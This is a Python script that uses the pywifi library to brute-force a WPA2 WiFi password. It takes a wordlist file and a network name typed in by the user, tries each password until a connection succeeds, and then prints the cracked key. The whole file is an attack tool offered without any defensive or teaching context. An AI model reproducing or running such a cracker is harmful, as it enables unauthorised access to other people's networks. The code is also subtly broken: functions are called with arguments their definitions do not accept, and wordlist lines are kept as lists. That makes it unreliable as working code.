import pywifi
from pywifi import const
import time
import sys
import os
import getopt
import argparse


def passwords_list():
    passwords = []
    with open(f, 'r', encoding='utf8') as words:
        for password in words:
            password = password.split("\n")
            passwords.append(password)
    return passwords


def bruteforce():
    if os.getuid() != 0:
        print("You need to have root privileges to use this program. Please "
              "try again using 'sudo'.\n")
        sys.exit()
    passwords = passwords_list(f)
#    wifi = pywifi.PyWiFi()
#    interfaces = wifi.interfaces()[0]

    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]

    wifi_name = input("Enter the name of the wifi network you want to try to "
                      "bruteforce:\n")
    start_time = time.time()
    for password in passwords:
        # profile.key = "rba5829qaBdk"
        profile = pywifi.Profile()
        profile.ssid = wifi_name
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        profile.key = password[0]
        interface.remove_all_network_profiles()
        new_profile = interface.add_network_profile(profile)
        time.sleep(1)
        interface.connect(new_profile)

        while interface.status() == const.IFACE_CONNECTING:
            print("connecting pls wait")
            time.sleep(1)

        if interface.status() == const.IFACE_CONNECTED:
            print("Connected ! password for {} is {}\n".format(profile.ssid,
                                                               profile.key))
            print("Execution took {} seconds.".format(time.time()-start_time))
           # interface.disconnect()
            exit()
        else:
            print(profile.key)


f = ''
parser = argparse.ArgumentParser()
parser.add_argument("file")
args = parser.parse_args()
f = args.file
print(f)
if not os.path.exists(f):
    print(f)
    print("file does not exists.")
    sys.exit()
bruteforce(f)
